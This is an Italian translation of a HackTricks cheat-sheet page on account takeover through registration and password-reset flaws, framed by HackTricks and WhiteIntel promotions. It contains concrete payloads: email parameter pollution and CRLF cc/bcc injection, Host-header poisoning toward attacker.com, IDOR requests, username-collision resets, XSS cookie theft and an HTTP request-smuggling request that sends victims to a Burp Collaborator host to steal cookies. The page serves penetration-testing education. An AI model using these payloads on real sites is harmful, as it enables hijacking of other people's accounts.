# Vulnerabilit√† di Registrazione e Takeover

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale √® contrastare i takeover di account e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore gratuitamente su:

{% embed url="https://whiteintel.io" %}

---

## Takeover di Registrazione

### Registrazione Duplicata

* Prova a generare utilizzando un username esistente
* Controlla variando l'email:
  * maiuscole
  * \+1@
  * aggiungi qualche punto nell'email
  * caratteri speciali nel nome dell'email (%00, %09, %20)
  * Metti caratteri neri dopo l'email: `test@test.com a`
  * victim@gmail.com@attacker.com
  * victim@attacker.com@gmail.com

### Enumerazione Username

Controlla se riesci a capire quando un username √® gi√† stato registrato all'interno dell'applicazione.

### Politica delle Password

Creando un utente controlla la politica delle password (verifica se puoi utilizzare password deboli).\
In tal caso potresti provare a forzare le credenziali.

### Iniezione SQL

[**Controlla questa pagina** ](sql-injection/#insert-statement)per imparare come tentare takeover di account o estrarre informazioni tramite **Iniezioni SQL** nei moduli di registrazione.

### Takeover Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilit√† SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Cambio Email

Dopo esserti registrato prova a cambiare l'email e controlla se questa modifica viene correttamente convalidata o se puoi cambiarla con email arbitrarie.

### Altri Controlli

* Controlla se puoi utilizzare **email usa e getta**
* **Password** **lunga** (>200) porta a **DoS**
* **Controlla i limiti di velocit√† sulla creazione dell'account**
* Usa username@**burp\_collab**.net e analizza il **callback**

## **Takeover di Reset Password**

### Fuga Token Reset Password tramite Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Richiedi il reset della password al tuo indirizzo email
2. Clicca sul link di reset della password
3. Non cambiare la password
4. Clicca su qualsiasi sito di terze parti (es: Facebook, Twitter)
5. Intercepisci la richiesta nel proxy di Burp Suite
6. Controlla se l'header referer sta rilasciando il token di reset della password.

### Avvelenamento Reset Password <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepisci la richiesta di reset password in Burp Suite
2. Aggiungi o modifica i seguenti header in Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Inoltra la richiesta con l'header modificato\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Cerca un URL di reset password basato sull'_host header_ come: `https://attacker.com/reset-password.php?token=TOKEN`

### Reset Password tramite Parametro Email <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR sui Parametri dell'API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. L'attaccante deve effettuare il login con il proprio account e accedere alla funzionalit√† **Cambia password**.
2. Avviare Burp Suite e intercettare la richiesta.
3. Inviare la richiesta alla scheda repeater e modificare i parametri: ID Utente/email\
`powershell POST /api/changepass [...] ("form": {"email":"vittima@email.com","password":"passwordsicura"})`

### Token debole per il Reset della Password <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Il token per il reset della password dovrebbe essere generato casualmente e unico ogni volta.\
Provare a determinare se il token scade o se √® sempre lo stesso, in alcuni casi l'algoritmo di generazione √® debole e pu√≤ essere indovinato. Le seguenti variabili potrebbero essere utilizzate dall'algoritmo.

* Timestamp
* ID Utente
* Email dell'Utente
* Nome e Cognome
* Data di Nascita
* Crittografia
* Solo numeri
* Sequenza di token breve (caratteri tra \[A-Z,a-z,0-9])
* Riutilizzo del token
* Data di scadenza del token

### Divulgazione del Token per il Reset della Password <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Inviare una richiesta di reset della password utilizzando l'API/UI per un'email specifica, ad esempio: testo@mail.com
2. Ispezionare la risposta del server e controllare il `resetToken`
3. Utilizzare quindi il token in un URL come `https://esempio.com/v3/utente/password/reset?resetToken=[IL_RESET_TOKEN]&email=[LA_MAIL]`

### Reset della Password tramite Collisione del Nome Utente <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrarsi nel sistema con un nome utente identico a quello della vittima, ma con spazi bianchi inseriti prima e/o dopo il nome utente. ad esempio: `"admin "`
2. Richiedere un reset della password con il proprio nome utente malintenzionato.
3. Utilizzare il token inviato alla propria email e reimpostare la password della vittima.
4. Accedere all'account della vittima con la nuova password.

La piattaforma CTFd era vulnerabile a questo attacco.\
Vedere: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Presa del Controllo dell'Account tramite Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Trovare un XSS all'interno dell'applicazione o di un sottodominio se i cookie sono limitati al dominio principale: `*.dominio.com`
2. Divulgare il **cookie della sessione** attuale
3. Autenticarsi come l'utente utilizzando il cookie

### Presa del Controllo dell'Account tramite Smuggling della Richiesta HTTP <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Utilizzare **smuggler** per rilevare il tipo di Smuggling della Richiesta HTTP (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Creare una richiesta che sovrascriver√† il `POST / HTTP/1.1` con i seguenti dati:\
`GET http://qualcosa.burpcollaborator.net HTTP/1.1 X:` con l'obiettivo di reindirizzare le vittime a burpcollab e rubare i loro cookie\
3. La richiesta finale potrebbe assomigliare alla seguente
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### Account Takeover tramite CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Creare un payload per il CSRF, ad esempio: "Modulo HTML con invio automatico per un cambio password"
2. Inviare il payload

### Account Takeover tramite JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Il JSON Web Token potrebbe essere utilizzato per autenticare un utente.

* Modificare il JWT con un altro ID utente / Email
* Verificare una firma JWT debole

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Riferimenti

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)


## WhiteIntel

<figure><img src=".gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) √® un motore di ricerca alimentato dal **dark web** che offre funzionalit√† **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.

Il loro obiettivo principale √® contrastare gli account takeover e gli attacchi ransomware derivanti da malware che rubano informazioni.

Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:

{% embed url="https://whiteintel.io" %}


<details>

<summary><strong>Impara l'hacking su AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
